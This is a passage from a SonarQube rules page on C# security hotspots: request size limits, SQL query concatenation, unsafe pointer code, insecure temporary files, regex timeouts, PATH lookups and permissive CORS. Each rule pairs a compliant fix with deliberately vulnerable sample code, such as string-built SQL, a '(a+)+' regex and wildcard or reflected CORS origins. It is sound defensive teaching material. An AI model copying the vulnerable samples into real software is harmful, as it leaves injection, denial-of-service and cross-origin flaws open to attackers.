  for your Application Load Balancers </li>
  <li> <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html">AWS
  Documentation</a> - Stream Encryption </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S5693">
              csharpsquid:S5693
            </a>
          </td>
          <td>
            <details>
              <p>Rejecting requests with significant content length is a good practice to control the network traffic intensity and thus resource consumption in
order to prevent DoS attacks.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> size limits are not defined for the different resources of the web application. </li>
  <li> the web application is not protected by <a href="https://en.wikipedia.org/wiki/Rate_limiting">rate limiting</a> features. </li>
  <li> the web application infrastructure has limited resources. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> For most of the features of an application, it is recommended to limit the size of requests to:
    <ul>
      <li> lower or equal to 8mb for file uploads. </li>
      <li> lower or equal to 2mb for other requests. </li>
    </ul>  </li>
</ul>
<p>It is recommended to customize the rule with the limit values that correspond to the web application.</p>
<h2>Sensitive Code Example</h2>
<pre>
using Microsoft.AspNetCore.Mvc;

public class MyController : Controller
{
    [HttpPost]
    [DisableRequestSizeLimit] // Sensitive: No size  limit
    [RequestSizeLimit(10485760)] // Sensitive: 10485760 B = 10240 KB = 10 MB is more than the recommended limit of 8MB
    public IActionResult PostRequest(Model model)
    {
    // ...
    }

    [HttpPost]
    [RequestFormLimits(MultipartBodyLengthLimit = 10485760)] // Sensitive: 10485760 B = 10240 KB = 10 MB is more than the recommended limit of 8MB
    public IActionResult MultipartFormRequest(Model model)
    {
    // ...
    }
}
</pre>
<p>In Web.config:</p>
<pre>
&lt;configuration&gt;
    &lt;system.web&gt;
        &lt;httpRuntime maxRequestLength="81920" executionTimeout="3600" /&gt;
        &lt;!-- Sensitive: maxRequestLength is expressed in KB, so 81920 KB = 80 MB  --&gt;
    &lt;/system.web&gt;
    &lt;system.webServer&gt;
        &lt;security&gt;
            &lt;requestFiltering&gt;
                &lt;requestLimits maxAllowedContentLength="83886080" /&gt;
                &lt;!-- Sensitive: maxAllowedContentLength is expressed in bytes, so 83886080 B = 81920 KB = 80 MB  --&gt;
            &lt;/requestFiltering&gt;
        &lt;/security&gt;
    &lt;/system.webServer&gt;
&lt;/configuration&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
using Microsoft.AspNetCore.Mvc;

public class MyController : Controller
{
    [HttpPost]
    [RequestSizeLimit(8388608)] // Compliant: 8388608 B = 8192 KB = 8 MB
    public IActionResult PostRequest(Model model)
    {
    // ...
    }

    [HttpPost]
    [RequestFormLimits(MultipartBodyLengthLimit = 8388608)] // Compliant: 8388608 B = 8192 KB = 8 MB
    public IActionResult MultipartFormRequest(Model model)
    {
    // ...
    }
}
</pre>
<p>In Web.config:</p>
<pre>
&lt;configuration&gt;
    &lt;system.web&gt;
        &lt;httpRuntime maxRequestLength="8192" executionTimeout="3600" /&gt;
        &lt;!-- Compliant: maxRequestLength is expressed in KB, so 8192 KB = 8 MB  --&gt;
    &lt;/system.web&gt;
    &lt;system.webServer&gt;
        &lt;security&gt;
            &lt;requestFiltering&gt;
                &lt;requestLimits maxAllowedContentLength="8388608" /&gt;
                &lt;!-- Compliant: maxAllowedContentLength is expressed in bytes, so 8388608 B = 8192 KB = 8 MB  --&gt;
            &lt;/requestFiltering&gt;
        &lt;/security&gt;
    &lt;/system.webServer&gt;
&lt;/configuration&gt;
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html">Owasp Cheat Sheet</a> - Owasp Denial of Service
  Cheat Sheet </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/770">CWE-770 - Allocation of Resources Without Limits or Throttling</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/400">CWE-400 - Uncontrolled Resource Consumption</a> </li>
  <li> <a href="https://docs.microsoft.com/en-us/aspnet/core/host-and-deploy/iis/web-config">Web.config</a> - XML-formatted config file for IIS
  applications </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S2077">
              csharpsquid:S2077
            </a>
          </td>
          <td>
            <details>
              <p>Formatted SQL queries can be difficult to maintain, debug and can increase the risk of SQL injection when concatenating untrusted values into the
query. However, this rule doesn’t detect SQL injections (unlike rule <a href='/organizations/sopra-steria/rules?open=csharpsquid%3AS3649&rule_key=csharpsquid%3AS3649'>S3649</a>), the goal is only to highlight complex/formatted
queries.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Some parts of the query come from untrusted values (like user inputs). </li>
  <li> The query is repeated/duplicated in other parts of the code. </li>
  <li> The application must support different types of relational databases. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use <a href="https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html">parameterized queries, prepared
  statements, or stored procedures</a> and bind variables to SQL query parameters. </li>
  <li> Consider using ORM frameworks if there is a need to have an abstract layer to access data. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
public void Foo(DbContext context, string query, string param)
{
    string sensitiveQuery = string.Concat(query, param);
    context.Database.ExecuteSqlCommand(sensitiveQuery); // Sensitive
    context.Query&lt;User&gt;().FromSql(sensitiveQuery); // Sensitive

    context.Database.ExecuteSqlCommand($"SELECT * FROM mytable WHERE mycol={value}", param); // Sensitive, the FormattableString is evaluated and converted to RawSqlString
    string query = $"SELECT * FROM mytable WHERE mycol={param}";
    context.Database.ExecuteSqlCommand(query); // Sensitive, the FormattableString has already been evaluated, it won't be converted to a parametrized query.
}

public void Bar(SqlConnection connection, string param)
{
    SqlCommand command;
    string sensitiveQuery = string.Format("INSERT INTO Users (name) VALUES (\"{0}\")", param);
    command = new SqlCommand(sensitiveQuery); // Sensitive

    command.CommandText = sensitiveQuery; // Sensitive

    SqlDataAdapter adapter;
    adapter = new SqlDataAdapter(sensitiveQuery, connection); // Sensitive
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void Foo(DbContext context, string query, string param)
{
    context.Database.ExecuteSqlCommand("SELECT * FROM mytable WHERE mycol=@p0", param); // Compliant, it's a parametrized safe query
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/89">CWE-89 - Improper Neutralization of Special Elements used in an SQL Command</a> </li>
  <li> Derived from FindSecBugs rules <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA">Potential SQL/JPQL Injection
  (JPA)</a>, <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO">Potential SQL/JDOQL Injection (JDO)</a>, <a
  href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE">Potential SQL/HQL Injection (Hibernate)</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S6640">
              csharpsquid:S6640
            </a>
          </td>
          <td>
            <details>
              <p>Using <code>unsafe</code> code blocks can lead to unintended security or stability risks.</p>
<p><code>unsafe</code> code blocks allow developers to use features such as pointers, fixed buffers, function calls through pointers and manual memory
management. Such features may be necessary for interoperability with native libraries, as these often require pointers. It may also increase
performance in some critical areas, as certain bounds checks are not executed in an unsafe context.</p>
<p><code>unsafe</code> code blocks aren’t necessarily dangerous, however, the contents of such blocks are not verified by the Common Language Runtime.
Therefore, it is up to the programmer to ensure that no bugs are introduced through manual memory management or casting. If not done correctly, then
those bugs can lead to memory corruption vulnerabilities such as stack overflows. <code>unsafe</code> code blocks should be used with caution because
of these security and stability risks.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> There are any pointers or fixed buffers declared within the <code>unsafe</code> code block. </li>
</ul>
<p>There is a risk if you answered yes to the question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Unless absolutely necessary, do not use <code>unsafe</code> code blocks. If <code>unsafe</code> is used to increase performance, then the <a
href="https://learn.microsoft.com/en-us/dotnet/standard/memory-and-spans/">Span and Memory APIs</a> may serve a similar purpose in a safe context.</p>
<p>If it is not possible to remove the code block, then it should be kept as short as possible. Doing so reduces risk, as there is less code that can
potentially introduce new bugs. Within the <code>unsafe</code> code block, make sure that:</p>
<ul>
  <li> All type casts are correct. </li>
  <li> Memory is correctly allocated and then released. </li>
  <li> Array accesses can never go out of bounds. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre data-diff-id="1" data-diff-type="noncompliant">
public unsafe int SubarraySum(int[] array, int start, int end)  // Sensitive
{
    var sum = 0;

    // Skip array bound checks for extra performance
    fixed (int* firstNumber = array)
    {
        for (int i = start; i &lt; end; i++)
            sum += *(firstNumber + i);
    }

    return sum;
}
</pre>
<h2>Compliant Solution</h2>
<pre data-diff-id="1" data-diff-type="compliant">
public int SubarraySum(int[] array, int start, int end)
{
    var sum = 0;

    Span&lt;int&gt; span = array.AsSpan();
    for (int i = start; i &lt; end; i++)
        sum += span[i];

    return sum;
}
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/787">CWE-787 - Out-of-bounds Write</a> </li>
  <li> <a href="https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/unsafe-code">Microsoft Learn</a> - Unsafe code, pointer types, and
  function pointers </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S5443">
              csharpsquid:S5443
            </a>
          </td>
          <td>
            <details>
              <p>Operating systems have global directories where any user has write access. Those folders are mostly used as temporary storage areas like
<code>/tmp</code> in Linux based systems. An application manipulating files from these folders is exposed to race conditions on filenames: a malicious
user can try to create a file with a predictable name before the application does. A successful attack can result in other files being accessed,
modified, corrupted or deleted. This risk is even higher if the application runs with elevated permissions.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2012-2451">CVE-2012-2451</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-1838">CVE-2015-1838</a> </li>
</ul>
<p>This rule raises an issue whenever it detects a hard-coded path to a publicly writable directory like <code>/tmp</code> (see examples bellow). It
also detects access to environment variables that point to publicly writable directories, e.g., <code>TMP</code>, <code>TMPDIR</code> and
<code>TEMP</code>.</p>
<ul>
  <li> <code>/tmp</code> </li>
  <li> <code>/var/tmp</code> </li>
  <li> <code>/usr/tmp</code> </li>
  <li> <code>/dev/shm</code> </li>
  <li> <code>/dev/mqueue</code> </li>
  <li> <code>/run/lock</code> </li>
  <li> <code>/var/run/lock</code> </li>
  <li> <code>/Library/Caches</code> </li>
  <li> <code>/Users/Shared</code> </li>
  <li> <code>/private/tmp</code> </li>
  <li> <code>/private/var/tmp</code> </li>
  <li> <code>\Windows\Temp</code> </li>
  <li> <code>\Temp</code> </li>
  <li> <code>\TMP</code> </li>
  <li> <code>%USERPROFILE%\AppData\Local\Temp</code> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Files are read from or written into a publicly writable folder </li>
  <li> The application creates files with predictable names into a publicly writable folder </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Out of the box, .NET is missing secure-by-design APIs to create temporary files. To overcome this, one of the following options can be used:</p>
<ul>
  <li> Use a dedicated sub-folder with tightly controlled permissions </li>
  <li> Created temporary files in a publicly writable folder and make sure:
    <ul>
      <li> Generated filename is unpredictable </li>
      <li> File is readable and writable only by the creating user ID </li>
      <li> File descriptor is not inherited by child processes </li>
      <li> File is destroyed as soon as it is closed </li>
    </ul>  </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
using var writer = new StreamWriter("/tmp/f"); // Sensitive
</pre>
<pre>
var tmp = Environment.GetEnvironmentVariable("TMP"); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
var randomPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());

// Creates a new file with write, non inheritable permissions which is deleted on close.
using var fileStream = new FileStream(randomPath, FileMode.CreateNew, FileAccess.Write, FileShare.None, 4096, FileOptions.DeleteOnClose);
using var writer = new StreamWriter(fileStream);
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/377">CWE-377 - Insecure Temporary File</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/379">CWE-379 - Creation of Temporary File in Directory with Incorrect Permissions</a>
  </li>
  <li> <a href="https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File">OWASP, Insecure Temporary File</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S5445">
              csharpsquid:S5445
            </a>
          </td>
          <td>
            <details>
              <p>Temporary files are considered insecurely created when the file existence check is performed separately from the actual file creation. Such a
situation can occur when creating temporary files using normal file handling functions or when using dedicated temporary file handling functions that
are not atomic.</p>
<h2>Why is this an issue?</h2>
<p>Creating temporary files in a non-atomic way introduces race condition issues in the application’s behavior. Indeed, a third party can create a
given file between when the application chooses its name and when it creates it.</p>
<p>In such a situation, the application might use a temporary file that it does not entirely control. In particular, this file’s permissions might be
different than expected. This can lead to trust boundary issues.</p>
<h3>What is the potential impact?</h3>
<p>Attackers with control over a temporary file used by a vulnerable application will be able to modify it in a way that will affect the application’s
logic. By changing this file’s Access Control List or other operating system-level properties, they could prevent the file from being deleted or
emptied. They may also alter the file’s content before or while the application uses it.</p>
<p>Depending on why and how the affected temporary files are used, the exploitation of a race condition in an application can have various
consequences. They can range from sensitive information disclosure to more serious application or hosting infrastructure compromise.</p>
<h4>Information disclosure</h4>
<p>Because attackers can control the permissions set on temporary files and prevent their removal, they can read what the application stores in them.
This might be especially critical if this information is sensitive.</p>
<p>For example, an application might use temporary files to store users' session-related information. In such a case, attackers controlling those
files can access session-stored information. This might allow them to take over authenticated users' identities and entitlements.</p>
<h4>Attack surface extension</h4>
<p>An application might use temporary files to store technical data for further reuse or as a communication channel between multiple components. In
that case, it might consider those files part of the trust boundaries and use their content without additional security validation or sanitation. In
such a case, an attacker controlling the file content might use it as an attack vector for further compromise.</p>
<p>For example, an application might store serialized data in temporary files for later use. In such a case, attackers controlling those files'
content can change it in a way that will lead to an insecure deserialization exploitation. It might allow them to execute arbitrary code on the
application hosting server and take it over.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<p>The following code example is vulnerable to a race condition attack because it creates a temporary file using an unsafe API function.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
using System.IO;

public void Example()
{
    var tempPath = Path.GetTempFileName();  // Noncompliant

    using (var writer = new StreamWriter(tempPath))
    {
        writer.WriteLine("content");
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
using System.IO;

public void Example()
{
    var randomPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());

    using (var fileStream = new FileStream(randomPath, FileMode.CreateNew, FileAccess.Write, FileShare.None, 4096, FileOptions.DeleteOnClose))
    using (var writer = new StreamWriter(fileStream))
    {
        writer.WriteLine("content");
    }
}
</pre>
<h3>How does this work?</h3>
<p>Applications should create temporary files so that no third party can read or modify their content. It requires that the files' name, location, and
permissions are carefully chosen and set. This can be achieved in multiple ways depending on the applications' technology stacks.</p>
<h4>Strong security controls</h4>
<p>Temporary files can be created using unsafe functions and API as long as strong security controls are applied. Non-temporary file-handling
functions and APIs can also be used for that purpose.</p>
<p>In general, applications should ensure that attackers can not create a file before them. This turns into the following requirements when creating
the files:</p>
<ul>
  <li> Files should be created in a non-public directory. </li>
  <li> File names should be unique. </li>
  <li> File names should be unpredictable. They should be generated using a cryptographically secure random generator. </li>
  <li> File creation should fail if a target file already exists. </li>
</ul>
<p>Moreover, when possible, it is recommended that applications destroy temporary files after they have finished using them.</p>
<p>Here the example compliant code uses the <code>Path.GetTempPath</code> and <code>Path.GetRandomFileName</code> functions to generate a unique
random file name. The file is then open with the <code>FileMode.CreateNew</code> option that will ensure the creation fails if the file already
exists. The <code>FileShare.None</code> option will additionally prevent the file from being opened again by any process. To finish, this code ensures
the file will get destroyed once the application has finished using it with the <code>FileOptions.DeleteOnClose</code> option.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File">OWASP</a> - Insecure Temporary File </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/377">CWE-377 - Insecure Temporary File</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/379">CWE-379 - Creation of Temporary File in Directory with Incorrect Permissions</a>
  </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S6444">
              csharpsquid:S6444
            </a>
          </td>
          <td>
            <details>
              <p>Not specifying a timeout for regular expressions can lead to a Denial-of-Service attack. Pass a timeout when using
<code>System.Text.RegularExpressions</code> to process untrusted input because a malicious user might craft a value for which the evaluation lasts
excessively long.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the input passed to the regular expression is untrusted. </li>
  <li> the regular expression contains patterns vulnerable to <a href="https://www.regular-expressions.info/catastrophic.html">catastrophic
  backtracking</a>. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> It is recommended to specify a <a
  href="https://learn.microsoft.com/dotnet/standard/base-types/best-practices#use-time-out-values"><code>matchTimeout</code></a> when executing a
  regular expression. </li>
  <li> Make sure regular expressions are not vulnerable to Denial-of-Service attacks by reviewing the patterns. </li>
  <li> Consider using a non-backtracking algorithm by specifying <a
  href="https://learn.microsoft.com/dotnet/api/system.text.regularexpressions.regexoptions?view=net-7.0"><code>RegexOptions.NonBacktracking</code></a>. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
public void RegexPattern(string input)
{
    var emailPattern = new Regex(".+@.+", RegexOptions.None);
    var isNumber = Regex.IsMatch(input, "[0-9]+");
    var isLetterA = Regex.IsMatch(input, "(a+)+");
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void RegexPattern(string input)
{
    var emailPattern = new Regex(".+@.+", RegexOptions.None, TimeSpan.FromMilliseconds(100));
    var isNumber = Regex.IsMatch(input, "[0-9]+", RegexOptions.None, TimeSpan.FromMilliseconds(100));
    var isLetterA = Regex.IsMatch(input, "(a+)+", RegexOptions.NonBacktracking); // .Net 7 and above
    AppDomain.CurrentDomain.SetData("REGEX_DEFAULT_MATCH_TIMEOUT", TimeSpan.FromMilliseconds(100)); // process-wide setting
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/400">CWE-400 - Uncontrolled Resource Consumption</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1333">CWE-1333 - Inefficient Regular Expression Complexity</a> </li>
  <li> <a href="https://www.regular-expressions.info/catastrophic.html">regular-expressions.info</a> - Runaway Regular Expressions: Catastrophic
  Backtracking </li>
  <li> <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS">owasp.org</a> - Regular expression Denial of
  Service - ReDoS </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1333">CWE-1333 - Inefficient Regular Expression Complexity</a> </li>
  <li> <a href="https://docs.microsoft.com/dotnet/standard/base-types/best-practices">docs.microsoft.com</a> - Best practices for regular expressions
  in .NET </li>
  <li> <a href="https://docs.microsoft.com/dotnet/standard/base-types/backtracking-in-regular-expressions">docs.microsoft.com</a> - Backtracking in
  Regular Expressions </li>
  <li> <a
  href="https://devblogs.microsoft.com/dotnet/regular-expression-improvements-in-dotnet-7/#backtracking-and-regexoptions-nonbacktracking">devblogs.microsoft.com</a> - Regular Expression Improvements in .NET 7: Backtracking (and RegexOptions.NonBacktracking) </li>
  <li> <a href="https://docs.microsoft.com/dotnet/api/system.text.regularexpressions.regex.matchtimeout">docs.microsoft.com</a> - Regex.MatchTimeout
  Property </li>
  <li> <a href="https://docs.microsoft.com/dotnet/api/system.text.regularexpressions.regexoptions?view=net-7.0">docs.microsoft.com</a> - RegexOptions
  Enum (NonBacktracking option) </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S4036">
              csharpsquid:S4036
            </a>
          </td>
          <td>
            <details>
              <p>When executing an OS command and unless you specify the full path to the executable, then the locations in your application’s <code>PATH</code>
environment variable will be searched for the executable. That search could leave an opening for an attacker if one of the elements in
<code>PATH</code> is a directory under his control.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The directories in the PATH environment variable may be defined by not trusted entities. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Fully qualified/absolute path should be used to specify the OS command to execute.</p>
<h2>Sensitive Code Example</h2>
<pre>
Process p = new Process();
p.StartInfo.FileName = "binary"; // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
Process p = new Process();
p.StartInfo.FileName = @"C:\Apps\binary.exe"; // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">Top 10 2021 Category A8 - Software and Data Integrity
  Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/426">CWE-426 - Untrusted Search Path</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/427">CWE-427 - Uncontrolled Search Path Element</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S5122">
              csharpsquid:S5122
            </a>
          </td>
          <td>
            <details>
              <p>Having a permissive Cross-Origin Resource Sharing policy is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0269">CVE-2018-0269</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14460">CVE-2017-14460</a> </li>
</ul>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">Same origin policy</a> in browsers prevents, by default and for
security-reasons, a javascript frontend to perform a cross-origin HTTP request to a resource that has a different origin (domain, protocol, or port)
from its own. The requested target can append additional HTTP headers in response, called <a
href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">CORS</a>, that act like directives for the browser and change the access control policy
/ relax the same origin policy.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> You don’t trust the origin specified, example: <code>Access-Control-Allow-Origin: untrustedwebsite.com</code>. </li>
  <li> Access control policy is entirely disabled: <code>Access-Control-Allow-Origin: *</code> </li>
  <li> Your access control policy is dynamically defined by a user-controlled input like <a
  href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin"><code>origin</code></a> header. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> The <code>Access-Control-Allow-Origin</code> header should be set only for a trusted origin and for specific resources. </li>
  <li> Allow only selected, trusted domains in the <code>Access-Control-Allow-Origin</code> header. Prefer whitelisting domains over blacklisting or
  allowing any domain (do not use * wildcard nor blindly return the <code>Origin</code> header content without any checks). </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>ASP.NET Core MVC:</p>
<pre>
[HttpGet]
public string Get()
{
    Response.Headers.Add("Access-Control-Allow-Origin", "*"); // Sensitive
    Response.Headers.Add(HeaderNames.AccessControlAllowOrigin, "*"); // Sensitive
}
</pre>
<pre>
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =&gt;
    {
        options.AddDefaultPolicy(builder =&gt;
        {
            builder.WithOrigins("*"); // Sensitive
        });

        options.AddPolicy(name: "EnableAllPolicy", builder =&gt;
        {
            builder.WithOrigins("*"); // Sensitive
        });

        options.AddPolicy(name: "OtherPolicy", builder =&gt;
        {
            builder.AllowAnyOrigin(); // Sensitive
        });
    });

    services.AddControllers();
}
</pre>
<p>ASP.NET MVC:</p>
<pre>
public class HomeController : ApiController
{
    public HttpResponseMessage Get()
    {
        var response = HttpContext.Current.Response;

        response.Headers.Add("Access-Control-Allow-Origin", "*"); // Sensitive
        response.Headers.Add(HeaderNames.AccessControlAllowOrigin, "*"); // Sensitive
        response.AppendHeader(HeaderNames.AccessControlAllowOrigin, "*"); // Sensitive
    }
}
</pre>
<pre>
[EnableCors(origins: "*", headers: "*", methods: "GET")] // Sensitive
public HttpResponseMessage Get() =&gt; new HttpResponseMessage()
{
    Content = new StringContent("content")
};
</pre>
<p>User-controlled origin:</p>
<pre>
String origin = Request.Headers["Origin"];
Response.Headers.Add("Access-Control-Allow-Origin", origin); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>ASP.NET Core MVC:</p>
<pre>
[HttpGet]
public string Get()
{
    Response.Headers.Add("Access-Control-Allow-Origin", "https://trustedwebsite.com"); // Safe
    Response.Headers.Add(HeaderNames.AccessControlAllowOrigin, "https://trustedwebsite.com"); // Safe
}
</pre>
<pre>
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =&gt;
    {
        options.AddDefaultPolicy(builder =&gt;
        {
            builder.WithOrigins("https://trustedwebsite.com", "https://anothertrustedwebsite.com"); // Safe
        });

        options.AddPolicy(name: "EnableAllPolicy", builder =&gt;
        {
            builder.WithOrigins("https://trustedwebsite.com"); // Safe
        });
    });

    services.AddControllers();
}
</pre>
<p>ASP.Net MVC:</p>
<pre>
public class HomeController : ApiController
{
    public HttpResponseMessage Get()
    {
        var response = HttpContext.Current.Response;

        response.Headers.Add("Access-Control-Allow-Origin", "https://trustedwebsite.com");
        response.Headers.Add(HeaderNames.AccessControlAllowOrigin, "https://trustedwebsite.com");
        response.AppendHeader(HeaderNames.AccessControlAllowOrigin, "https://trustedwebsite.com");
    }
}
</pre>
<pre>
[EnableCors(origins: "https://trustedwebsite.com", headers: "*", methods: "GET")]
public HttpResponseMessage Get() =&gt; new HttpResponseMessage()
{
    Content = new StringContent("content")
};
</pre>
<p>User-controlled origin validated with an allow-list:</p>
<pre>
String origin = Request.Headers["Origin"];

if (trustedOrigins.Contains(origin))
{
    Response.Headers.Add("Access-Control-Allow-Origin", origin);
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">developer.mozilla.org</a> - CORS </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">developer.mozilla.org</a> - Same origin policy </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing">OWASP HTML5 Security
  Cheat Sheet</a> - Cross Origin Resource Sharing </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/346">CWE-346 - Origin Validation Error</a> </li>
